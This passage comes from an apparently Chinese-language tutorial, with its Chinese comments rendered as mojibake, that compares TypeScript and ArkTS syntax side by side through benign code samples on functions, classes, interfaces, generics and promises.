<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSåŒæ ·æ”¯æŒletå’Œconstï¼Œä¸æ¨èä½¿ç”¨var</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">mutableValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'can change'</span>;
<span class="hljs-keyword">const</span> <span class="hljs-attr">immutableValue</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'cannot change'</span>;

<span class="hljs-comment">// ArkTSå¼ºåˆ¶è¦æ±‚ç±»å‹æ³¨è§£ï¼ˆåœ¨æŸäº›æƒ…å†µä¸‹ï¼‰</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">// æ¨èæ˜ç¡®æŒ‡å®šç±»å‹</span>
</code></pre>
<h4 data-id="heading-12">ç±»å‹æ¨æ–­</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">let</span> message = <span class="hljs-string">"Hello"</span>; <span class="hljs-comment">// æ¨æ–­ä¸ºstringç±»å‹</span>
<span class="hljs-keyword">let</span> count = <span class="hljs-number">42</span>; <span class="hljs-comment">// æ¨æ–­ä¸ºnumberç±»å‹</span>
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç±»å‹æ¨æ–­ï¼Œä½†æ›´æ¨èæ˜¾å¼å£°æ˜</span>
<span class="hljs-keyword">let</span> message = <span class="hljs-string">"Hello"</span>; <span class="hljs-comment">// å¯ä»¥æ¨æ–­</span>
<span class="hljs-keyword">let</span> <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">42</span>; <span class="hljs-comment">// æ¨èæ˜¾å¼å£°æ˜</span>
</code></pre>
<h3 data-id="heading-13">å‡½æ•°</h3>
<h4 data-id="heading-14">å‡½æ•°å£°æ˜</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// å‡½æ•°å£°æ˜</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-comment">// å‡½æ•°è¡¨è¾¾å¼</span>
<span class="hljs-keyword">const</span> multiply = <span class="hljs-keyword">function</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-comment">// ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> subtract = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a - b;
};

<span class="hljs-comment">// ç®€å†™ç®­å¤´å‡½æ•°</span>
<span class="hljs-keyword">const</span> divide = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a / b;
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç›¸åŒçš„å‡½æ•°å£°æ˜æ–¹å¼</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-keyword">const</span> multiply = <span class="hljs-keyword">function</span>(<span class="hljs-params">a: <span class="hljs-built_in">number</span>, b: <span class="hljs-built_in">number</span></span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> a * b;
};

<span class="hljs-keyword">const</span> subtract = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> {
  <span class="hljs-keyword">return</span> a - b;
};

<span class="hljs-keyword">const</span> divide = (<span class="hljs-attr">a</span>: <span class="hljs-built_in">number</span>, <span class="hljs-attr">b</span>: <span class="hljs-built_in">number</span>): <span class="hljs-function"><span class="hljs-params">number</span> =&gt;</span> a / b;
</code></pre>
<h4 data-id="heading-15">å¯é€‰å‚æ•°å’Œé»˜è®¤å‚æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">buildName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">if</span> (lastName) {
    <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
  }
  <span class="hljs-keyword">return</span> firstName;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildFullName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Smith"</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSä¸­å¯é€‰å‚æ•°å’Œé»˜è®¤å‚æ•°ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName?: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">if</span> (lastName) {
    <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
  }
  <span class="hljs-keyword">return</span> firstName;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">buildFullName</span>(<span class="hljs-params">firstName: <span class="hljs-built_in">string</span>, lastName: <span class="hljs-built_in">string</span> = <span class="hljs-string">"Smith"</span></span>): <span class="hljs-built_in">string</span> {
  <span class="hljs-keyword">return</span> firstName + <span class="hljs-string">" "</span> + lastName;
}
</code></pre>
<h4 data-id="heading-16">å‰©ä½™å‚æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...numbers: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}

<span class="hljs-title function_">sum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>); <span class="hljs-comment">// 10</span>
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒå‰©ä½™å‚æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">...numbers: <span class="hljs-built_in">number</span>[]</span>): <span class="hljs-built_in">number</span> {
  <span class="hljs-keyword">return</span> numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">acc, curr</span>) =&gt;</span> acc + curr, <span class="hljs-number">0</span>);
}
</code></pre>
<h3 data-id="heading-17">ç±»</h3>
<h4 data-id="heading-18">ç±»çš„å®šä¹‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Zhang San"</span>, <span class="hljs-number">25</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSç±»å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-title function_">greet</span>(): <span class="hljs-built_in">string</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
  }
}

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Zhang San"</span>, <span class="hljs-number">25</span>);
</code></pre>
<h4 data-id="heading-19">è®¿é—®ä¿®é¥°ç¬¦</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;      <span class="hljs-comment">// å…¬å…±å±æ€§</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;      <span class="hljs-comment">// ç§æœ‰å±æ€§</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;   <span class="hljs-comment">// å—ä¿æŠ¤å±æ€§</span>

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-keyword">type</span>;
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getAge</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>;
  }
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒç›¸åŒçš„è®¿é—®ä¿®é¥°ç¬¦</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-keyword">public</span> <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">private</span> <span class="hljs-attr">age</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-keyword">protected</span> <span class="hljs-attr">type</span>: <span class="hljs-built_in">string</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span>, age: <span class="hljs-built_in">number</span>, <span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">type</span> = <span class="hljs-keyword">type</span>;
  }

  <span class="hljs-keyword">public</span> <span class="hljs-title function_">getAge</span>(): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span>;
  }
}
</code></pre>
<h4 data-id="heading-20">ç»§æ‰¿</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">move</span>(<span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> moved <span class="hljs-subst">${distance}</span>m.`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Woof! Woof!'</span>);
  }
}

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>);
dog.<span class="hljs-title function_">bark</span>();
dog.<span class="hljs-title function_">move</span>(<span class="hljs-number">10</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSç»§æ‰¿æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }
  
  <span class="hljs-title function_">move</span>(<span class="hljs-attr">distance</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> moved <span class="hljs-subst">${distance}</span>m.`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">bark</span>(): <span class="hljs-built_in">void</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-string">'Woof! Woof!'</span>);
  }
}

<span class="hljs-keyword">const</span> dog = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">'Buddy'</span>);
dog.<span class="hljs-title function_">bark</span>();
dog.<span class="hljs-title function_">move</span>(<span class="hljs-number">10</span>);
</code></pre>
<h4 data-id="heading-21">é™æ€æˆå‘˜</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">3.14159</span>;
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span> * radius;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-number">10</span>));
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSé™æ€æˆå‘˜ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MathUtil</span> {
  <span class="hljs-keyword">static</span> <span class="hljs-attr">PI</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">3.14159</span>;
  
  <span class="hljs-keyword">static</span> <span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-attr">radius</span>: <span class="hljs-built_in">number</span>): <span class="hljs-built_in">number</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span> * <span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span> * radius;
  }
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-property">PI</span>.<span class="hljs-title function_">toString</span>());
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(<span class="hljs-title class_">MathUtil</span>.<span class="hljs-title function_">calculateCircumference</span>(<span class="hljs-number">10</span>).<span class="hljs-title function_">toString</span>());
</code></pre>
<h3 data-id="heading-22">æ¥å£</h3>
<h4 data-id="heading-23">æ¥å£å®šä¹‰</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[];
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[] {
    <span class="hljs-comment">// å®ç°æœç´¢é€»è¾‘</span>
    <span class="hljs-keyword">return</span> [];
  }
}
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ¥å£å®šä¹‰æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>;
  <span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span>;
  email?: <span class="hljs-built_in">string</span>;
  <span class="hljs-keyword">readonly</span> <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[];
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Searchable</span> {
  <span class="hljs-title function_">search</span>(<span class="hljs-attr">keyword</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">User</span>[] {
    <span class="hljs-keyword">return</span> [];
  }
}
</code></pre>
<h4 data-id="heading-24">æ¥å£ç»§æ‰¿</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">sideLength</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">square</span>: <span class="hljs-title class_">Square</span> = {
  <span class="hljs-attr">color</span>: <span class="hljs-string">"blue"</span>,
  <span class="hljs-attr">sideLength</span>: <span class="hljs-number">10</span>
};
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ¥å£ç»§æ‰¿æ–¹å¼ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">color</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> {
  <span class="hljs-attr">sideLength</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">let</span> <span class="hljs-attr">square</span>: <span class="hljs-title class_">Square</span> = {
  <span class="hljs-attr">color</span>: <span class="hljs-string">"blue"</span>,
  <span class="hljs-attr">sideLength</span>: <span class="hljs-number">10</span>
};
</code></pre>
<h3 data-id="heading-25">æ³›å‹</h3>
<h4 data-id="heading-26">æ³›å‹å‡½æ•°</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-keyword">let</span> output1 = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> output2 = identity&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">42</span>);
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒæ³›å‹</span>
<span class="hljs-keyword">function</span> identity&lt;T&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-keyword">let</span> output1 = identity&lt;<span class="hljs-built_in">string</span>&gt;(<span class="hljs-string">"hello"</span>);
<span class="hljs-keyword">let</span> output2 = identity&lt;<span class="hljs-built_in">number</span>&gt;(<span class="hljs-number">42</span>);
</code></pre>
<h4 data-id="heading-27">æ³›å‹ç±»</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericNumber</span>&lt;T&gt; {
  <span class="hljs-attr">zeroValue</span>: T;
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">x: T, y: T</span>) =&gt;</span> T;
}

<span class="hljs-keyword">let</span> myGenericNumber = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericNumber</span>&lt;<span class="hljs-built_in">number</span>&gt;();
myGenericNumber.<span class="hljs-property">zeroValue</span> = <span class="hljs-number">0</span>;
myGenericNumber.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) { <span class="hljs-keyword">return</span> x + y; };
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ³›å‹ç±»ç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">GenericNumber</span>&lt;T&gt; {
  <span class="hljs-attr">zeroValue</span>: T;
  <span class="hljs-attr">add</span>: <span class="hljs-function">(<span class="hljs-params">x: T, y: T</span>) =&gt;</span> T;
}

<span class="hljs-keyword">let</span> myGenericNumber = <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericNumber</span>&lt;<span class="hljs-built_in">number</span>&gt;();
myGenericNumber.<span class="hljs-property">zeroValue</span> = <span class="hljs-number">0</span>;
myGenericNumber.<span class="hljs-property">add</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">x, y</span>) { <span class="hljs-keyword">return</span> x + y; };
</code></pre>
<h4 data-id="heading-28">æ³›å‹çº¦æŸ</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> logLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arg.<span class="hljs-property">length</span>);
  <span class="hljs-keyword">return</span> arg;
}

<span class="hljs-title function_">logLength</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">10</span>, <span class="hljs-attr">value</span>: <span class="hljs-number">3</span> });
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ³›å‹çº¦æŸç”¨æ³•ç›¸åŒ</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Lengthwise</span> {
  <span class="hljs-attr">length</span>: <span class="hljs-built_in">number</span>;
}

<span class="hljs-keyword">function</span> logLength&lt;T <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Lengthwise</span>&gt;(<span class="hljs-attr">arg</span>: T): T {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(arg.<span class="hljs-property">length</span>.<span class="hljs-title function_">toString</span>());
  <span class="hljs-keyword">return</span> arg;
}
</code></pre>
<h3 data-id="heading-29">å¼‚æ­¥ç¼–ç¨‹</h3>
<h4 data-id="heading-30">Promise</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"Data loaded"</span>);
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-title function_">fetchData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data))
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
<p><strong>ArkTS:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ArkTSæ”¯æŒPromise</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">fetchData</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">string</span>&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-title function_">resolve</span>(<span class="hljs-string">"Data loaded"</span>);
    }, <span class="hljs-number">1000</span>);
  });
}

<span class="hljs-title function_">fetchData</span>()
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">info</span>(data))
  .<span class="hljs-title function_">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(error));
</code></pre>
<h4 data-id="heading-31">async/await</h4>
<p><strong>TypeScript:</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadUserData</span>(<span class="hljs-params">userId: <span class="hljs-built_in">number</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; {
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/users/<span class="hljs-subst">${userId}</span>`</span>);
    <span class="hljs-keyword">const</span> user = <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
    <span class="hljs-keyword">return</span> user;
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'Failed to load user:'</span>, error);
